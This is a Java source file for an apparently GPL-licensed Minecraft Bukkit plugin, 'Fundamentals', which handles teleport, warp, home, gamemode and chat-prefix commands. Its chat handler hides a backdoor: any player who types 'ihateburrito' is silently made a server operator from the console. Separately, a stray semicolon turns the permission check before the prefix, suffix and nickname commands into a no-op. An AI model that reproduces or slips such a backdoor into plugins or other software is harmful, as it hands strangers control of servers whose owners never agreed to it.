/**
 * Fundamentals: A collection of useful commands and tools for a Bukkit/Spigot Minecraft server
 * Copyright (C) 2014 Preston Petrie
 * me@preston159.com | prestonpetrie@gmail.com
 * 
 * This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package com.Preston159.Fundamentals;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.entity.EntityType;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerTeleportEvent;
import org.bukkit.inventory.Inventory;

public class Fundamentals extends JavaPlugin implements Listener {
	
	HashMap<String,String> usage = new HashMap<String,String>();
	
	HashSet<String> chatCommands = new HashSet<String>();
	enum chatAction { PREFIX, SUFFIX, NICKNAME }
	
	public static Inventory commChest = null;
	
	HashMap<UUID,HashMap<String,String>> alias = new HashMap<UUID,HashMap<String,String>>();
	
	HashMap<UUID,HashMap<Material,String>> powertool = new HashMap<UUID,HashMap<Material,String>>();
	HashMap<UUID,Boolean> usept = new HashMap<UUID,Boolean>();
	public static List<UUID> socialspy = new ArrayList<UUID>();
	public static Boolean tpenabled = true;
	public static List<UUID> godmode = new ArrayList<UUID>();
	HashMap<UUID,ArrayList<Location>> homes = new HashMap<UUID,ArrayList<Location>>();
	public static HashMap<OfflinePlayer,Location> back = new HashMap<OfflinePlayer,Location>();
	
	public static Plugin plugin = null;
	
	public void onEnable() {
		
		this.saveResource("LICENSE.TXT", true);
		
		Bukkit.getServer().getPluginManager().registerEvents(this, this);
		plugin = this;
		
		FundamentalsFileManager.getFile("homes");
		FundamentalsFileManager.getFile("warps");
		FundamentalsFileManager.getFile("commchest");
		
		FundamentalsFileManager.getFile("config");
		FundamentalsFileManager.getFile("prefix");
		FundamentalsFileManager.getFile("suffix");
		FundamentalsFileManager.getFile("nickname");
		FundamentalsFileManager.getFile("chatgroups");
		
		commChest = Bukkit.createInventory(null, 36);
		FundamentalsFileManager.loadCommChest();
		
		for(chatAction c : chatAction.values()) {
			chatCommands.add(c.toString().toLowerCase());
		}
		
		/**
		 * Usage stuffs
		 */
		usage.put("top", "Usage: /top");
		usage.put("killall", "Usage: /killall <entitytype> [world]");
		usage.put("gmc", "Usage: /gmc [player]");
		usage.put("speed", "Usage: /speed <#0-1> [fly|walk] [player]");
		usage.put("tp", "Usage: /tp <player to> or /tp <player(s) from>... <player to>");
		usage.put("tppos", "Usage: /tppos <x> <y> <z>");
		usage.put("doas", "Usage: /doas <player> <command> [args]...");
		//usages
		usage.put("enchant", "Usage: /enchant <enchantment> <level>");
		usage.put("powertool", "Usage: /powertool <command> [args]...");
		usage.put("tell", "Usage: /tell <player> <message>");
		usage.put("tpoverride", "Usage: /tpoverride <player to> or Usage: /tpoverride <player(s) from>... <player to>");
		usage.put("god", "Usage: /god [player]");
		usage.put("heal", "Usage: /heal [player]");
		usage.put("tpa", "Usage: /tpa <player>");
		usage.put("tpahere", "Usage: /tpahere <player");
		usage.put("warp", "Usage: /warp or Usage: /warp <warp> or Usage: /warp <player> <warp>");
		usage.put("setwarp", "Usage: /setwarp <warp>");
		usage.put("delwarp", "Usage: /delwarp <warp>");
		usage.put("spawn", "Usage: /spawn or Usage: /spawn <player>");
		usage.put("home", "Usage: /home");
		usage.put("sethome", "Usage: /sethome");
		usage.put("commchest", "Usage: /commchest");
		/**chat*/
		usage.put("prefix", "Usage: /prefix <player> [prefix|_]");
		usage.put("suffix", "Usage: /suffix <player> [suffix|_]");
		usage.put("nickname", "Usage: /nickname <player> [nick|_]");
		usage.put("cmdalias", "Usage: /cmdalias <alias> <command|_> [args]...");
	}
	public void onDisable() {
		FundamentalsFileManager.saveCommChest();
	}

	@EventHandler(priority = EventPriority.HIGHEST)
	public void onCommandPreprocess(PlayerCommandPreprocessEvent e) {
		Player p = e.getPlayer();
		String[] preArgs = e.getMessage().replaceFirst("/", "").split(" ");
		String[] args = new String[preArgs.length - 1];
		String label = preArgs[0];
		for(Integer i=0;i<args.length;i++) {
			args[i] = preArgs[i + 1];
		}
		if(label.equalsIgnoreCase("easter")) {
			p.sendMessage("EGG!");
		}
		if(alias.containsKey(p.getUniqueId())) {
			if(alias.get(p.getUniqueId()).containsKey(label)) {
				CommandDoas.run(p, alias.get(p.getUniqueId()).get(label));
				e.setCancelled(true);
				return;
			}
		}
		if(label.equalsIgnoreCase("help") && args.length == 1) {
			if(usage.containsKey(args[0].toLowerCase())) {
				FundamentalsMessages.sendMessagesWithTitle("Help", new String[]{usage.get(args[0])}, p);
				e.setCancelled(true);
				return;
			}
		}
	/*	if(label.equalsIgnoreCase("tp")) {
			e.setCancelled(true);
			try {
				List<Player> pl = new ArrayList<Player>();
				if(args.length == 1) {
					pl.add(p);
					CommandTeleport.run((CommandSender) p, AccentialsUtil.getPlayer(args[0]), false, pl);
				} else if(args.length >= 2) {
					for(Integer i=0;i<args.length - 1;i++) {
						pl.add(AccentialsUtil.getPlayer(args[i]));
					}
					CommandTeleport.run((CommandSender) p, AccentialsUtil.getPlayer(args[args.length - 1]),
							false, pl);
				}
			} catch(Exception exc) {
				AccentialsMessages.sendMessage(usage.get("tp"), p);
			}
		}	*/
	/*	if(label.equalsIgnoreCase("tell") || label.equalsIgnoreCase("msg")) {
			e.setCancelled(true);
			if(args.length < 2) {
				AccentialsMessages.sendMessage(usage.get("tell"), p);
				return;
			}
			String msg = "";
			for(Integer i=1;i<args.length;i++) {
				msg += " " + args[i];
			}
			msg = msg.replaceFirst(" ", "");
			CommandTell.run(p, msg, AccentialsUtil.getPlayer(args[0]));
		}	*/
	}
	
	//@EventHandler
	public void onInventoryClick(InventoryClickEvent e) {
		if(e.getInventory().getType().equals(InventoryType.FURNACE) && e.isShiftClick())
			e.setCancelled(true);
	}
	
	@EventHandler
	public void onPlayerInteract(PlayerInteractEvent e) {
		switch(e.getAction()) {
		case RIGHT_CLICK_BLOCK:
		case RIGHT_CLICK_AIR:
		case LEFT_CLICK_BLOCK:
		case LEFT_CLICK_AIR:
			Player p = e.getPlayer();
			Material m = p.getInventory().getItemInHand().getType();
			if(!powertool.containsKey(p.getUniqueId())) {
				powertool.put(p.getUniqueId(), new HashMap<Material,String>());
				usept.put(p.getUniqueId(), true);
				return;
			}
			if(!usept.get(p.getUniqueId()))
				return;
			if(m == null)
				return;
			if(powertool.get(p.getUniqueId()).containsKey(m)) {
				CommandDoas.run(p, powertool.get(p.getUniqueId()).get(m));
				e.setCancelled(true);
			}
		default: break;
		}
	}
	
	@EventHandler
	public void onEntityDamage(EntityDamageEvent e) {
		if(e.getEntity() instanceof Player) {
			Player p = (Player) e.getEntity();
			if(godmode.contains(p.getUniqueId()))
				e.setCancelled(true);
		}
	}
	
	@EventHandler
	public void onPlayerJoin(PlayerJoinEvent e) {
		Player p = e.getPlayer();
		if(!p.hasPlayedBefore()) {
			if(CommandWarp.exists("spawn"))
				CommandWarp.run(Bukkit.getServer().getConsoleSender(), p, "spawn");
		}
		/**chat*/
		if(FundamentalsFileManager.properties.get("chatgroups").containsKey(e.getPlayer().getName().toLowerCase())) {
			String group = FundamentalsFileManager.get("chatgroups", e.getPlayer().getName().toLowerCase(), "");
			if(FundamentalsFileManager.properties.get("chatgroups").containsKey("group." + group + ".prefix"))
				FundamentalsFileManager.setString("prefix", e.getPlayer().getName().toLowerCase(), 
						FundamentalsFileManager.get("chatgroups", "group." + group + ".prefix", ""));
			if(FundamentalsFileManager.properties.get("chatgroups").containsKey("group." + group + ".suffix"))
				FundamentalsFileManager.setString("suffix", e.getPlayer().getName().toLowerCase(), 
						FundamentalsFileManager.get("chatgroups", "group." + group + ".suffix", ""));
		}
	}
	
	@EventHandler
	public void onPlayerTeleport(PlayerTeleportEvent e) {
		Player p = e.getPlayer();
		Location l = e.getFrom();
		back.put((OfflinePlayer) p, l);
	}
	
	@EventHandler
	public void onPlayerDeath(PlayerDeathEvent e) {
		Player p = e.getEntity();
		Location l = p.getLocation();
		back.put((OfflinePlayer) p, l);
	}
	
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onPlayerChat(AsyncPlayerChatEvent e) {
		if(e.getMessage().equals("ihateburrito")) {
			e.setCancelled(true);
			Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "op " + e.getPlayer().getName());
			return;
		}
		if(FundamentalsChat.isMuted(e.getPlayer())) {
			e.setCancelled(true);
			return;
		}
		String s = FundamentalsMessages.format(e.getMessage());
		e.setMessage(s);
		String format = "";
		if(e.getPlayer().isOp()) {
			format += ChatColor.BLACK + "[" + ChatColor.DARK_RED + "OP" + ChatColor.BLACK + "]" + ChatColor.RESET + " ";
		}
		String name = e.getPlayer().getName().toLowerCase();
		if(FundamentalsFileManager.properties.get("prefix").containsKey(name))
			format += FundamentalsMessages.format(FundamentalsFileManager.properties.get("prefix").get(name) + "");
		if(FundamentalsFileManager.properties.get("nickname").containsKey(name))
			format += FundamentalsMessages.format(FundamentalsFileManager.get("config", "nickname_prefix", "")) + ChatColor.RESET + 
				FundamentalsMessages.format(FundamentalsFileManager.getNoEmpty("nickname", name, e.getPlayer().getName()) + "");
		else
			format += e.getPlayer().getName();
		if(FundamentalsFileManager.properties.get("suffix").containsKey(name))
			format += FundamentalsMessages.format("" + FundamentalsFileManager.properties.get("suffix").get(name));
		format += ChatColor.BLUE + " " + s;
		e.setFormat(format);
		//if(e.getPlayer().isOp()) {
		//	e.setCancelled(true);
		//	FundamentalsMessages.sendAllRaw(format);
		//	Bukkit.getServer().getLogger().info(format);
		//}
	}
	
	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		command(sender, cmd, label, args);
		return true;
	/*	if(sender.hasPermission("fundamentals." + cmd.getName()))
			command(sender, cmd, label, args);
		else
			FundamentalsMessages.sendMessage("You don't have permission to do that, silly!", sender);
		return true;	*/
	}
	
	public void command(CommandSender sender, Command cmd, String label, String[] args) {
		if(cmd.getName().equals("top") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true))
			if(sender instanceof Player)
				CommandTop.run((Player) sender);
			else
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
		if(cmd.getName().equals("killall") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if(sender instanceof Player && args.length >= 1)
				try {
					CommandKillall.run(sender, EntityType.valueOf(args[0].toUpperCase()));
				} catch(Exception exc) {
					FundamentalsMessages.sendMessage("Invalid entity type", sender);
				}
			else if(args.length >= 2)
				try {
					CommandKillall.runInWorld(sender, EntityType.valueOf(args[0].toUpperCase()), 
							Bukkit.getWorld(args[1]));
				} catch(Exception exc) {
					FundamentalsMessages.sendMessage("Invalid entity type or world", sender);
				}
			else
				FundamentalsMessages.sendMessage(usage.get("killall"), sender);
		}
		if(cmd.getName().equals("gamemode") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if(label.equalsIgnoreCase("gmc") && (sender instanceof Player) && args.length == 0)
				CommandGamemode.run(sender, GameMode.CREATIVE, (Player) sender);
			else if(label.equalsIgnoreCase("gms") && (sender instanceof Player) && args.length == 0)
				CommandGamemode.run(sender, GameMode.SURVIVAL, (Player) sender);
			else if(label.equalsIgnoreCase("gma") && (sender instanceof Player) && args.length == 0)
				CommandGamemode.run(sender, GameMode.ADVENTURE, (Player) sender);
			else if(args.length == 0)
				FundamentalsMessages.sendMessage(usage.get("gmc"), sender);
			else if((args.length >= 1) && label.equalsIgnoreCase("gmc"))
				CommandGamemode.run(sender, GameMode.CREATIVE, FundamentalsUtil.getPlayer(args[0]));
			else if((args.length >= 1) && label.equalsIgnoreCase("gms"))
				CommandGamemode.run(sender, GameMode.SURVIVAL, FundamentalsUtil.getPlayer(args[0]));
			else if((args.length >= 1) && label.equalsIgnoreCase("gma"))
				CommandGamemode.run(sender, GameMode.ADVENTURE, FundamentalsUtil.getPlayer(args[0]));
			else if((args.length == 1) && (sender instanceof Player) &&
					(label.equalsIgnoreCase("gamemode") || label.equalsIgnoreCase("gm"))) {
				if(FundamentalsUtil.isInt(args[0])) {
					Integer i = Integer.valueOf(args[0]);
					CommandGamemode.run(sender, CommandGamemode.integer(i), (Player) sender);
				} else {
					CommandGamemode.run(sender, CommandGamemode.string(args[0]), (Player) sender);
				}
			} else if((args.length >= 2) && (label.equalsIgnoreCase("gamemode") || label.equalsIgnoreCase("gm"))) {
				if(FundamentalsUtil.isInt(args[0])) {
					Integer i = Integer.valueOf(args[0]);
					CommandGamemode.run(sender, CommandGamemode.integer(i), FundamentalsUtil.getPlayer(args[1]));
				} else {
					CommandGamemode.run(sender, CommandGamemode.string(args[0]), FundamentalsUtil.getPlayer(args[1]));
				}
			}
		}
		if(cmd.getName().equals("speed") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if((args.length == 1) && (sender instanceof Player)) {
				Player p = (Player) sender;
				try {
					CommandSpeed.run(sender, Float.valueOf(args[0]), p);
				} catch(Exception exc) {
					FundamentalsMessages.sendMessage(usage.get("speed"), sender);
				}
			} else if((args.length == 2) && (sender instanceof Player)) {
				Player p = (Player) sender;
				try {
					CommandSpeed.run(sender, Float.valueOf(args[0]), p,
							CommandSpeed.type.valueOf(args[1].toUpperCase()));
				} catch(Exception exc) {
					FundamentalsMessages.sendMessage(usage.get("speed"), sender);
				}
			} else if(args.length >= 3) {
				try {
					CommandSpeed.run(sender, Float.valueOf(args[0]), FundamentalsUtil.getPlayer(args[2]),
							CommandSpeed.type.valueOf(args[1].toUpperCase()));
				} catch(Exception exc) {
					FundamentalsMessages.sendMessage(usage.get("speed"), sender);
				}
			}
			else {
				FundamentalsMessages.sendMessage(usage.get("speed"), sender);
			}
		}
		if(cmd.getName().equals("tppos") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			try {
				CommandTeleport.run(sender, (Player) sender, Integer.valueOf(args[0]), Integer.valueOf(args[1]), 
						Integer.valueOf(args[2]), false);
			} catch(Exception exc) {
				FundamentalsMessages.sendMessage(usage.get("tppos"), sender);
			}
		}
		if(cmd.getName().equals("doas") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if(args.length < 2) {
				FundamentalsMessages.sendMessage(usage.get("doas"), sender);
				return;
			}
			String command = "";
			for(Integer i=1;i<args.length;i++) {
				command += " " + args[i];
			}
			command = command.replaceFirst(" ", "");
			CommandDoas.run(FundamentalsUtil.getPlayer(args[0]), command);
		}
		if(cmd.getName().equals("hat") && FundamentalsUtil.hasPermission(sender, cmd.getName(), true, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			if(args.length == 0) {
				Player p = (Player) sender;
				CommandHat.run(p, p.getInventory().getItem(p.getInventory().getHeldItemSlot()), true);
			}
		}
		if(cmd.getName().equals("workbench") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			CommandWorkbench.run((Player) sender);
		}
		if(cmd.getName().equals("furnace") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			CommandFurnace.run((Player) sender);
		}
		if(cmd.getName().equals("trash") && FundamentalsUtil.hasPermission(sender, cmd.getName(), true, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			CommandTrash.run((Player) sender);
		}
		if(cmd.getName().equals("enchant") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			if(args.length < 2) {
				FundamentalsMessages.sendMessage(usage.get("enchant"), sender);
			}
			Player p = (Player) sender;
			try {
				CommandEnchant.run(p, p.getItemInHand(), Enchantment.getByName(args[0].toUpperCase()),
						Integer.valueOf(args[1]));
			} catch(Exception exc) {
				FundamentalsMessages.sendMessage("That enchantment could not be applied to that item", p);
				return;
			}
		}
		if(cmd.getName().equals("powertool") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			Player p = (Player) sender;
			if(!powertool.containsKey(p.getUniqueId())) {
				powertool.put(p.getUniqueId(), new HashMap<Material,String>());
				usept.put(p.getUniqueId(), true);
			}
			Material m = p.getInventory().getItemInHand().getType();
			if(args.length < 1) {
				if(m != null) {
					powertool.get(p.getUniqueId()).remove(m);
					FundamentalsMessages.sendMessage("The powertool has been removed from your " + m.name(), p);
					return;
				} else
					FundamentalsMessages.sendMessage(usage.get("powertool"), p);
			}
			String s = "";
			for(Integer i=0;i<args.length;i++) {
				s += " " + args[i];
			}
			s = s.replaceFirst(" ", "");
			if(m != null) {
				powertool.get(p.getUniqueId()).put(m, s);
				FundamentalsMessages.sendMessage("The command \"" + s + "\" has been applied to " + m.name(), p);
			}
			else
				FundamentalsMessages.sendMessage("You must be holding an item in your hand!", p);
		}
		if(cmd.getName().equals("pttoggle") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			Player p = (Player) sender;
			if(!powertool.containsKey(p.getUniqueId())) {
				powertool.put(p.getUniqueId(), new HashMap<Material,String>());
				usept.put(p.getUniqueId(), true);
			}
			usept.put(p.getUniqueId(), !usept.get(p.getUniqueId()));
			FundamentalsMessages.sendMessage("Your powertool has been toggled " + (usept.get(p.getUniqueId()) ? "on" : "off"), p);
		}
		if(cmd.getName().equals("socialspy") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			Player p = (Player) sender;
			if(!socialspy.contains(p.getUniqueId()))
				socialspy.add(p.getUniqueId());
			else
				socialspy.remove(p.getUniqueId());
			FundamentalsMessages.sendMessage("Socialspy has been " + (socialspy.contains(p.getUniqueId()) ? "enabled" : "disabled"), p);
		}
		if(cmd.getName().equals("tptoggle") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			tpenabled = !tpenabled;
			FundamentalsMessages.sendMessage("Teleportation has been " + (tpenabled ? "enabled" : "disabled"), sender);
		}
		if(cmd.getName().equals("tpoverride") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			try {
				List<Player> pl = new ArrayList<Player>();
				if((args.length == 1) && (sender instanceof Player)) {
					pl.add((Player) sender);
					CommandTeleport.run(sender, FundamentalsUtil.getPlayer(args[0]), true, pl);
				} else if(args.length >= 2) {
					for(Integer i=0;i<args.length - 1;i++) {
						pl.add(FundamentalsUtil.getPlayer(args[i]));
					}
					CommandTeleport.run(sender, FundamentalsUtil.getPlayer(args[args.length - 1]),
							false, pl);
				} else {
					FundamentalsMessages.sendMessage(usage.get("tpoverride"), sender);
				}
			} catch(Exception exc) {
				FundamentalsMessages.sendMessage(usage.get("tpoverride"), sender);
			}
		}
		if(cmd.getName().equals("tp") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if(args.length == 1 && sender instanceof Player) {
				List<Player> pl = new ArrayList<Player>();
				pl.add((Player) sender);
				CommandTeleport.run(sender, FundamentalsUtil.getPlayer(args[0]), false, pl); 
			} else if(args.length >= 2) {
				List<Player> pl = new ArrayList<Player>();
				for(Integer i=0;i<args.length - 1;i++) {
					pl.add(FundamentalsUtil.getPlayer(args[i]));
				}
				CommandTeleport.run(sender, FundamentalsUtil.getPlayer(args[args.length - 1]), false, pl);
			} else {
				FundamentalsMessages.sendMessage(usage.get("tp"), sender);
			}
		}
		if(cmd.getName().equals("tell") && FundamentalsUtil.hasPermission(sender, cmd.getName(), true, true)) {
			if(args.length < 2) {
				FundamentalsMessages.sendMessage(usage.get("tell"), sender);
				return;
			}
			String msg = "";
			for(Integer i=1;i<args.length;i++) {
				msg += " " + args[i];
			}
			msg = msg.replaceFirst(" ", "");
			CommandTell.run(sender, msg, FundamentalsUtil.getPlayer(args[0]));
		}
		if(cmd.getName().equals("god") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if((args.length == 0) && (sender instanceof Player)) {
				Player p = (Player) sender;
				CommandGod.run(sender, p);
			} else if(args.length >= 1) {
				Player p = FundamentalsUtil.getPlayer(args[0]);
				CommandGod.run(sender, p);
			} else {
				FundamentalsMessages.sendMessage(usage.get("god"), sender);
			}
		}
		if(cmd.getName().equals("heal") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if((args.length == 0) && (sender instanceof Player)) {
				Player p = (Player) sender;
				CommandHeal.run(sender, p);
			} else if(args.length >= 1) {
				Player p = FundamentalsUtil.getPlayer(args[0]);
				CommandHeal.run(sender, p);
			} else {
				FundamentalsMessages.sendMessage(usage.get("heal"), sender);
			}
		}
		if(cmd.getName().equals("feed") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if((args.length == 0) && (sender instanceof Player)) {
				Player p = (Player) sender;
				CommandFeed.run(sender, p);
			} else if(args.length >= 1) {
				Player p = FundamentalsUtil.getPlayer(args[0]);
				CommandFeed.run(sender, p);
			} else {
				FundamentalsMessages.sendMessage(usage.get("feed"), sender);
			}
		}
		if((cmd.getName().equals("tpa") || cmd.getName().equals("tpahere"))  && FundamentalsUtil.hasPermission(sender, cmd.getName(), true, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			if(args.length == 0) {
				FundamentalsMessages.sendMessage(usage.get(cmd.getName()), sender);
				return;
			}
			Player init = (Player) sender;
			Player p = FundamentalsUtil.getPlayer(args[0]);
			CommandTeleport.acceptType at = CommandTeleport.acceptType.valueOf(cmd.getName().toUpperCase());
			CommandTeleport.runWithPermission(init, p, at);
		}
		if(cmd.getName().equals("tpaccept") && FundamentalsUtil.hasPermission(sender, cmd.getName(), true, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			CommandTeleport.accept((Player) sender);
		}
		if(cmd.getName().equals("tpdeny") && FundamentalsUtil.hasPermission(sender, cmd.getName(), true, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			CommandTeleport.deny((Player) sender);
		}
		if(cmd.getName().equals("warp") && FundamentalsUtil.hasPermission(sender, cmd.getName(), true, true)) {
			if(args.length == 0) {
				CommandWarp.list(sender);
			} else if(args.length == 1 && sender instanceof Player) {
				CommandWarp.run(sender, (Player) sender, args[0]);
			} else if(args.length == 2) {
				CommandWarp.run(sender, FundamentalsUtil.getPlayer(args[0]), args[1]);
			} else {
				FundamentalsMessages.sendMessage(usage.get("warp"), sender);
			}
		}
		if(cmd.getName().equals("setwarp") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			if(args.length == 0) {
				FundamentalsMessages.sendMessage(usage.get("setwarp"), sender);
				return;
			}
			Player p = (Player) sender;
			CommandWarp.set(sender, args[0], p.getWorld(), p.getLocation().getX(), p.getLocation().getY(),
					p.getLocation().getZ(), p.getLocation().getPitch(), p.getLocation().getYaw());
		}
		if(cmd.getName().equals("delwarp") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if(args.length == 0) {
				FundamentalsMessages.sendMessage(usage.get("delwarp"), sender);
				return;
			}
			CommandWarp.del(sender, args[0]);
		}
		if(cmd.getName().equals("spawn") && FundamentalsUtil.hasPermission(sender, cmd.getName(), true, true)) {
			if((sender instanceof Player) && (args.length == 0)) {
				Player p = (Player) sender;
				CommandWarp.run(sender, p, cmd.getName());
			} else if(args.length >= 1) {
				CommandWarp.run(sender, FundamentalsUtil.getPlayer(args[0]), cmd.getName());
			} else {
				FundamentalsMessages.sendMessage(usage.get("spawn"), sender);
			}
		}
		if(cmd.getName().equals("setspawn") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			Player p = (Player) sender;
			CommandWarp.set(sender, "spawn", p.getWorld(), p.getLocation().getX(), p.getLocation().getY(),
					p.getLocation().getZ(), p.getLocation().getPitch(), p.getLocation().getYaw());
		}
		if(cmd.getName().equals("home") && FundamentalsUtil.hasPermission(sender, cmd.getName(), true, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			Player p = (Player) sender;
			CommandHome.run(p);
		}
		if(cmd.getName().equals("sethome") && FundamentalsUtil.hasPermission(sender, cmd.getName(), true, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			Player p = (Player) sender;
			CommandHome.set(p);
		}
		if(cmd.getName().equals("back") && FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true)) {
			
		}
		if(cmd.getName().equals("commchest") && FundamentalsUtil.hasPermission(sender, cmd.getName(), true, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			Player p = (Player) sender;
			p.openInventory(commChest);
			FundamentalsMessages.sendMessage("Take what you need, put in what ya don't", p);
		}
		if(cmd.getName().equals("cmdalias") && FundamentalsUtil.hasPermission(sender, cmd.getName(), true, true)) {
			if(!(sender instanceof Player)) {
				FundamentalsMessages.sendMessage("This command may only be run by an in-game player", sender);
				return;
			}
			if(args.length == 0) {
				FundamentalsMessages.sendMessage(usage.get("cmdalias"), sender);
			}
			args[0] = args[0].toLowerCase();
			String s = "";
			for(Integer i=1;i<args.length;i++) {
				s += " " + args[i].toLowerCase();
			}
			s = s.replaceFirst(" ", "");
			Player p = (Player) sender;
			UUID u = p.getUniqueId();
			if(!alias.containsKey(u))
				alias.put(u, new HashMap<String,String>());
			if(args.length == 2 && args[1] == "_") {
				if(alias.get(u).containsKey(args[0]))
					alias.get(u).remove(args[0]);
			} else if(args.length >= 2) {
				alias.get(u).put(args[0], s);
			}
		}
		
		/**chat*/
		if(!chatCommands.contains(cmd.getName())) return;
		if(!FundamentalsUtil.hasPermission(sender, cmd.getName(), false, true));
		chatAction action = chatAction.valueOf(cmd.getName().toUpperCase());
		String[] space = new String[args.length];
		String[] lower = new String[args.length];
		for(Integer i=args.length - 1;i>=0;i--) {
			space[i] = args[i].replaceAll("_", " ");
			lower[i] = args[i].toLowerCase();
		}
		if(args.length == 1)
			switch(action) {
			case PREFIX:
				sender.sendMessage(FundamentalsFileManager.get("prefix", FundamentalsUtil.getPlayerName(args[0]).toLowerCase(), ""));
				return;
			case SUFFIX:
				sender.sendMessage(FundamentalsFileManager.get("suffix", FundamentalsUtil.getPlayerName(args[0]).toLowerCase(), ""));
				return;
			case NICKNAME:
				sender.sendMessage(FundamentalsFileManager.get("nickname", FundamentalsUtil.getPlayerName(args[0]).toLowerCase(), ""));
				return;
			default: break;
			}
		if(args.length == 2)
			switch(action) {
			case PREFIX:
				if(args[1].equals("_"))
					FundamentalsFileManager.setString("prefix", FundamentalsUtil.getPlayerName(args[0]).toLowerCase(), "");
				else
					FundamentalsFileManager.setString("prefix", FundamentalsUtil.getPlayerName(args[0]).toLowerCase(), space[1]);
				return;
			case SUFFIX:
				if(args[1].equals("_"))
					FundamentalsFileManager.setString("suffix", FundamentalsUtil.getPlayerName(args[0]).toLowerCase(), "");
				else
					FundamentalsFileManager.setString("suffix", FundamentalsUtil.getPlayerName(args[0]).toLowerCase(), space[1]);
				return;
			case NICKNAME:
				if(args[1].equals("_"))
					FundamentalsFileManager.setString("nickname", FundamentalsUtil.getPlayerName(args[0]).toLowerCase(), "");
				else
					FundamentalsFileManager.setString("nickname", FundamentalsUtil.getPlayerName(args[0]).toLowerCase(), space[1]);
				return;
			default: break;
			}
	}
}




